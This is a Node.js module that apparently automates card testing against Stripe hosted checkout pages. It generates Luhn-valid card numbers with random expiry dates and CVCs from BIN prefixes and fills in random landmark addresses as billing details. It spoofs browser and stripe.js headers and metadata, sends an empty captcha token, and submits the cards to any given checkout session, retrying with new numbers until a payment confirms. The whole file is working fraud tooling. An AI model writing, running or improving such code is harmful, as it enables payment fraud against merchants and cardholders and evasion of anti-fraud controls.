const https = require('https');
const { parseCheckoutUrl, fetchCheckoutInfo } = require('./checkout-info');

const LIST_ADDRESSES = [
  { line1: '1501 Gaylord Trail', city: 'Grapevine', state: 'TX', postal_code: '76051' },
  { line1: '221B Baker Street', city: 'London', state: 'LN', postal_code: 'NW1 6XE' },
  { line1: '500 Main St', city: 'Springfield', state: 'IL', postal_code: '62701' },
  { line1: '100 Market St', city: 'San Francisco', state: 'CA', postal_code: '94105' },
  { line1: '742 Evergreen Terrace', city: 'Springfield', state: 'OR', postal_code: '97477' },
  { line1: '12 Elm St', city: 'Boston', state: 'MA', postal_code: '02110' },
  { line1: '350 Fifth Ave', city: 'New York', state: 'NY', postal_code: '10118' },
  { line1: '1600 Pennsylvania Ave NW', city: 'Washington', state: 'DC', postal_code: '20500' },
  { line1: '4059 Mt Lee Dr', city: 'Los Angeles', state: 'CA', postal_code: '90068' },
  { line1: '1 Infinite Loop', city: 'Cupertino', state: 'CA', postal_code: '95014' },
  { line1: '233 S Wacker Dr', city: 'Chicago', state: 'IL', postal_code: '60606' },
  { line1: '221 Main St', city: 'Houston', state: 'TX', postal_code: '77002' },
  { line1: '3500 Deer Creek Rd', city: 'Palo Alto', state: 'CA', postal_code: '94304' },
  { line1: '123 Ocean Ave', city: 'Santa Monica', state: 'CA', postal_code: '90401' },
  { line1: '77 Massachusetts Ave', city: 'Cambridge', state: 'MA', postal_code: '02139' },
  { line1: '405 Lexington Ave', city: 'New York', state: 'NY', postal_code: '10174' },
  { line1: '600 Montgomery St', city: 'San Francisco', state: 'CA', postal_code: '94111' },
  { line1: '1234 Broadway', city: 'New York', state: 'NY', postal_code: '10001' },
  { line1: '1 Microsoft Way', city: 'Redmond', state: 'WA', postal_code: '98052' },
  { line1: '160 Spear St', city: 'San Francisco', state: 'CA', postal_code: '94105' },
  { line1: '500 Terry A Francois Blvd', city: 'San Francisco', state: 'CA', postal_code: '94158' },
  { line1: '1000 5th Ave', city: 'New York', state: 'NY', postal_code: '10028' },
  { line1: '1355 Market St', city: 'San Francisco', state: 'CA', postal_code: '94103' },
  { line1: '1 Liberty St', city: 'New York', state: 'NY', postal_code: '10006' },
  { line1: '600 E 4th St', city: 'Austin', state: 'TX', postal_code: '78701' },
  { line1: '2500 Broadway', city: 'New York', state: 'NY', postal_code: '10025' },
  { line1: '1400 John F Kennedy Blvd', city: 'Philadelphia', state: 'PA', postal_code: '19107' },
  { line1: '200 Central Park West', city: 'New York', state: 'NY', postal_code: '10024' },
  { line1: '3500 5th Ave', city: 'Pittsburgh', state: 'PA', postal_code: '15213' },
  { line1: '77 Hudson St', city: 'New York', state: 'NY', postal_code: '10013' }
];

function randomAddress() {
  return LIST_ADDRESSES[Math.floor(Math.random() * LIST_ADDRESSES.length)];
}

function generateRandomBin() {
    const bins = [
        '424242', '400000', '510510', '555555', '222222',
        '378282', '371449', '601111', '352800', '620000'
    ];
    return bins[Math.floor(Math.random() * bins.length)];
}

// Enhanced card generation with proper validation
function generateCardFromBin(bin) {
    if (!bin || typeof bin !== 'string') {
        throw new Error('Invalid BIN provided');
    }

    // Clean the BIN
    bin = bin.replace(/\D/g, '');
    
    if (bin.length < 6) {
        throw new Error('BIN must be at least 6 digits');
    }

    // Determine card length based on BIN prefix
    let targetLength = 16; // Default for most cards
    
    // American Express cards (start with 34 or 37) are 15 digits
    if (bin.startsWith('34') || bin.startsWith('37')) {
        targetLength = 15;
    }
    // Diners Club cards (start with 36, 38, 54, 55) can be 14-16 digits
    else if (bin.startsWith('36') || bin.startsWith('38')) {
        targetLength = 14;
    }

    // Generate random digits to fill up to target length - 1 (for check digit)
    let cardNumber = bin;
    while (cardNumber.length < targetLength - 1) {
        cardNumber += Math.floor(Math.random() * 10);
    }

    // Calculate Luhn check digit
    let sum = 0;
    let shouldDouble = true;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i]);
        if (shouldDouble) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        sum += digit;
        shouldDouble = !shouldDouble;
    }
    const checkDigit = (10 - (sum % 10)) % 10;
    cardNumber += checkDigit;

    // Generate expiration date (valid for next 2-5 years)
    const currentYear = new Date().getFullYear();
    const currentMonth = new Date().getMonth() + 1;
    
    // Generate month (1-12)
    const expMonth = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
    
    // Generate year (current year + 1 to 5 years in future)
    let expYear = currentYear + Math.floor(Math.random() * 5) + 1;
    
    // If same year, make sure month is in future
    if (expYear === currentYear && parseInt(expMonth) <= currentMonth) {
        expYear += 1;
    }
    
    expYear = String(expYear).slice(-2);

    // Generate CVC based on card type
    let cvc;
    if (targetLength === 15) {
        // Amex uses 4-digit CVC
        cvc = String(Math.floor(Math.random() * 9000) + 1000);
    } else {
        // Other cards use 3-digit CVC
        cvc = String(Math.floor(Math.random() * 900) + 100);
    }

    return { cardNumber, expMonth, expYear, cvc };
}

function parseCardString(cardString) {
    const parts = cardString.split('|').map(s => s.trim());
    if (parts.length < 4) {
        throw new Error('Card format must be: number|month|year|cvv');
    }

    let [cardNumber, expMonth, expYear, cvc] = parts;

    cardNumber = cardNumber.replace(/\s/g, '');

    if (expMonth.startsWith('0')) {
        expMonth = expMonth.slice(1);
    }
    expMonth = String(parseInt(expMonth)).padStart(2, '0');

    if (expYear.length === 2) {
        expYear = '20' + expYear;
    }
    expYear = expYear.slice(-2);

    return { cardNumber, expMonth, expYear, cvc };
}

function makeStripeRequest(url, data) {
    return new Promise((resolve, reject) => {
        const body = new URLSearchParams(data).toString();

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(body),
                'Accept': 'application/json',
                'Origin': 'https://checkout.stripe.com',
                'Referer': 'https://checkout.stripe.com/',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36'
            }
        };

        const req = https.request(url, options, (res) => {
            let buffer = '';
            res.on('data', chunk => buffer += chunk);
            res.on('end', () => {
                try {
                    const parsed = JSON.parse(buffer);
                    resolve({ statusCode: res.statusCode, data: parsed });
                } catch (err) {
                    reject(new Error('Invalid JSON response from Stripe'));
                }
            });
        });

        req.on('error', reject);
        req.write(body);
        req.end();
    });
}

async function createPaymentMethod({ cardNumber, expMonth, expYear, cvc, publicKey, sessionId, email, country = 'US', name = 'Test User', configId, address }) {
    const payload = {
        type: 'card',
        'card[number]': cardNumber,
        'card[cvc]': cvc,
        'card[exp_month]': expMonth,
        'card[exp_year]': expYear,
        'billing_details[name]': name,
        'billing_details[email]': email,
        'billing_details[address][country]': country,
        guid: 'NA',
        muid: 'NA',
        sid: 'NA',
        key: publicKey,
        'payment_user_agent': 'stripe.js/90ba939846; stripe-js-v3/90ba939846; checkout',
        'client_attribution_metadata[client_session_id]': sessionId,
        'client_attribution_metadata[merchant_integration_source]': 'checkout',
        'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]': 'automatic'
    };

    if (address) {
        if (address.line1) payload['billing_details[address][line1]'] = address.line1;
        if (address.city) payload['billing_details[address][city]'] = address.city;
        if (address.state) payload['billing_details[address][state]'] = address.state;
        if (address.postal_code) payload['billing_details[address][postal_code]'] = address.postal_code;
    }

    if (configId) {
        payload['client_attribution_metadata[checkout_config_id]'] = configId;
    }

    const response = await makeStripeRequest('https://api.stripe.com/v1/payment_methods', payload);
    return response;
}

async function confirmPayment({ paymentMethodId, sessionId, publicKey, expectedAmount, initChecksum, configId, jsChecksum }) {
    const payload = {
        eid: 'NA',
        payment_method: paymentMethodId,
        expected_amount: expectedAmount,
        'consent[terms_of_service]': 'accepted',
        expected_payment_method_type: 'card',
        guid: 'NA',
        muid: 'NA',
        sid: 'NA',
        key: publicKey,
        version: '90ba939846',
        init_checksum: initChecksum || '',
        passive_captcha_token: '',
        'client_attribution_metadata[client_session_id]': sessionId,
        'client_attribution_metadata[merchant_integration_source]': 'checkout',
        'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
        'client_attribution_metadata[payment_method_selection_flow]': 'automatic'
    };

    if (configId) {
        payload['client_attribution_metadata[checkout_config_id]'] = configId;
    }

    if (jsChecksum) {
        payload.js_checksum = jsChecksum;
    }

    const response = await makeStripeRequest(
        `https://api.stripe.com/v1/payment_pages/${sessionId}/confirm`,
        payload
    );
    return response;
}

async function attemptPayment({ checkoutUrl, card, retries = 0 }) {
    const parsed = parseCheckoutUrl(checkoutUrl);
    if (!parsed.sessionId || !parsed.publicKey) {
        throw new Error('Unable to extract session or public key from checkout URL');
    }

    const { sessionId, publicKey } = parsed;

    const info = await fetchCheckoutInfo({ sessionId, publicKey });
    const expectedAmount = info.totals?.total || 0;
    const email = info.customerEmail || 'test@example.com';
    const initChecksum = info.initChecksum || '';
    const configId = info.configId || null;

    let attempts = 0;
    let lastError = null;

    while (attempts <= retries) {
        attempts++;

        const currentCard = (typeof card === 'function') ? card() : card;

        try {
            const pmResponse = await createPaymentMethod({
                ...currentCard,
                publicKey,
                sessionId,
                email,
                country: 'US',
                name: 'Test User',
                configId,
                address: randomAddress()
            });

            if (pmResponse.statusCode !== 200 || !pmResponse.data.id) {
                lastError = pmResponse.data.error || { message: 'Failed to create payment method' };
                continue;
            }

            const paymentMethodId = pmResponse.data.id;

            const confirmResponse = await confirmPayment({
                paymentMethodId,
                sessionId,
                publicKey,
                expectedAmount,
                initChecksum,
                configId
            });

            const responseData = confirmResponse.data;
            const isComplete = responseData.status === 'complete';
            const requires3DS = responseData.payment_intent && 
                               responseData.payment_intent.status === 'requires_action' &&
                               responseData.payment_intent.next_action;

            if (confirmResponse.statusCode === 200 && (isComplete || requires3DS)) {
                return {
                    success: true,
                    attempts,
                    card: currentCard,
                    paymentMethod: pmResponse.data,
                    requires3DS: requires3DS,
                    paymentIntent: requires3DS ? {
                        id: responseData.payment_intent.id,
                        status: responseData.payment_intent.status,
                        amount: responseData.payment_intent.amount,
                        currency: responseData.payment_intent.currency
                    } : null,
                    confirmation: responseData
                };
            }

            lastError = confirmResponse.data.error || confirmResponse.data;
        } catch (err) {
            lastError = { message: err.message };
        }
    }

    return {
        success: false,
        attempts,
        error: lastError
    };
}

module.exports = {
    generateRandomBin,
    generateCardFromBin,
    parseCardString,
    createPaymentMethod,
    confirmPayment,
    attemptPayment
};
